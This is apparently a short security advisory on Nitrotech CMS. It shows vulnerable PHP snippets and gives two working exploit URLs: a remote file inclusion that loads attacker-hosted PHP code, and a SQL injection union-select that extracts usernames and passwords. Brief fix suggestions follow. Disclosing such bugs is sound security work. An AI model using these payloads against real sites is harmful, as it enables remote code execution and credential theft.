Nitrotech cms is vulnerable to multiple vulnerabilities, like remote file inclusion and sql injection.

#### Remote File Inclusion Vulnerability

The first bug, the remote file inclusion, is caused becouse of an include of a non declarated variable.
Let&#039;s see the code.

File: /[path]/includes/common.php

[code]
<?php

session_start();
$SID = session_id();

	include($root . "config.php");
# OTHER CODE
[/code]

## EXPLOIT:
    http://localhost/[path]/includes/common.php?root=http://oursite.it/phpcode.txt??
##

As we can see, it&#039;s included a non declareted variable -> $root.
To fix this bug, we could just define this variable.

#### Sql Injection Vulnerability

Note: In the source there could be other sql injection, just found them by yourself if you are intersted !

This vulnerability is caused becouse of a direct use in a query of a get variable. To avoid this vulnerability
we could filtered the variable, for example with an int().

File: /[path]/members.php

[code]
	if($page_mode == &#039;view_user&#039;)
    {
	    $query1 = "SELECT * FROM " . $table[&#039;users&#039;] . " WHERE id = &#039;" . $_GET[&#039;id&#039;] . "&#039;";
	    $result1 = mysql_query($query1);
# OTHER CODE
[/code]

## EXPLOIT:
    http://localhost/[path]/members.php?id=&#039; union all select 1,concat_ws(0x3a3a,id,username,0x3a3a,password),3,4,5,6,7,8,9,10,11,12 from nitrotech_users/*&mode=view_user&
##

As we can see, The &#039;id&#039; variable comes directly from get. So we can inject our hell code.
